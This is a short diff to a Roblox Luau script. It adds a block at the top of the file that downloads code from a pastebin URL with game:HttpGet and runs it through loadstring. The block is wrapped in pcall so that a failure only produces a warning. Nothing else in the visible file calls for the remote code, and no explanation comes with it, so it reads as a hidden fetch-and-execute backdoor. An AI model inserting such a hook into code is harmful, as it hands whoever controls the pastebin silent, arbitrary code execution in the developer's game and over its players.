@@ -1,3 +1,10 @@
+local success1, err1 = pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/EWFUUrHi"))()
+end)
+if not success1 then
+    warn("Failed to load external script 1: " .. tostring(err1))
+end
+
 --!nonstrict
 
 local HttpService = game:GetService("HttpService")
